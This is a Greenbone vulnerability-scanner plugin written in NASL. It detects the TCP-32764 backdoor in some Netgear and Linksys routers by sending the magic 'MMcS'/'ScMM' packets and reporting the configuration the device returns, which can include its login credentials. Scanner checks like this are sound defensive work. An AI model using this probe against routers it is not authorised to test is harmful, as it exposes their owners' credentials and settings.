# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103866");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("2023-07-26T05:05:09+0000");

  script_name("Netgear/Linksys Routers Backdoor");

  script_xref(name:"URL", value:"https://github.com/elvanderb/TCP-32764");

  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-01-02 14:46:14 +0100 (Thu, 02 Jan 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("General");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("find_service.nasl");
  script_require_ports(32764);

  script_tag(name:"impact", value:"An attacker can exploit this issue to disclose sensitive
  information. This may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted request and check the response.");

  script_tag(name:"insight", value:"By sending a special crafted request to port 32764 of the router, it
  is possible to gather e.g. the http username and http password or to change some
  configuration options which could lead in a shutdown of the internet connection.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"summary", value:"The remote Linksys/Netgear Router has a backdoor on port 32764.");

  script_tag(name:"affected", value:"Backdoor confirmed in:

  Linksys WAG200G, WAG320N

  Netgear DM111Pv2

  Backdoor may be present in:

  NetGear DG934, DG834, WPNT834, DG834G, WG602, WGR614, DGN200

  Linksys WAG120N, WAG160N, WRVS4400N

  The backdoor may be also present in other hardware.");

  exit(0);
}

include("misc_func.inc");

port = 32764;
if( ! get_port_state( port ) ) exit( 0 );

reqs = make_list( raw_string( "MMcS",1,0x00,0x00,0x00,0x00,0x00,0x00,0x00 ),
                  raw_string( "ScMM",0x00,0x00,0x00,1,0x00,0x00,0x00,0x00 ) ); # try big endian and little endian

foreach req ( reqs )
{
  soc = open_sock_tcp( port );
  if( ! soc ) exit( 0 );
  send( socket:soc, data:req );

  recv = recv( socket:soc, length:2048 );
  close( soc );

  if( "ScMM" >!< recv && "MMcS" >!< recv ) exit(0);

  if( strlen ( recv ) > 12 )
  {
    data = substr(recv, 12);
    data = str_replace(string:data, find:raw_string(0x00), replace:'\n');
    report = 'It was possible to retrieve the following details from the configuration:\n\n' + data + '\n' ;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );
